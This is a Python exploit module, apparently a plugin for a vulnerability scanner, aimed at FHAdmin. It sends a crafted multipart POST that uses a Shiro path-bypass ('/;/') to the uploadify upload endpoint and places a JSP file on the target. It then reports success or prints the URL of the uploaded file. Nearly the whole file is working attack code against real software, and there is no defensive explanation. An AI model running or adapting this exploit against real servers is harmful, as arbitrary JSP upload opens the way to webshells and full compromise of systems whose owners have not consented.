from util.ExpRequest import ExpRequest,Output
import util.globalvar as GlobalVar
"""
import util.globalvar as GlobalVar
from ClassCongregation import ysoserial_payload,Dnslog
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class FHAdmin():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
            
    def cve_20210824_upload(self):
        appName = 'FHAdmin'
        pocname = 'cve_20210824_upload'
        path = '/;/plugins/uploadify/uploadFile.jsp?uploadPath=/plugins/uploadify/'
        method = 'post'
        desc = '[upload] 任意文件上传+shiro权限绕过'
        data = '--6aaf12c632ee6febfc354d1ba1bc914b\r\nContent-Disposition: form-data; name="imgFile"; filename="a5s_9y.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n123\r\n--6aaf12c632ee6febfc354d1ba1bc914b--'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'multipart/form-data; boundary=6aaf12c632ee6febfc354d1ba1bc914b'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers)
                if r"2021" in r.text:
                    print(r.text)
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers).text
                print(self.url+'/;/plugins/uploadify/'+result.strip('\r\n')+'\n\n'+data)
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpFHAdmin = FHAdmin(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpFHAdmin, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(FHAdmin):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpFHAdmin, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)
















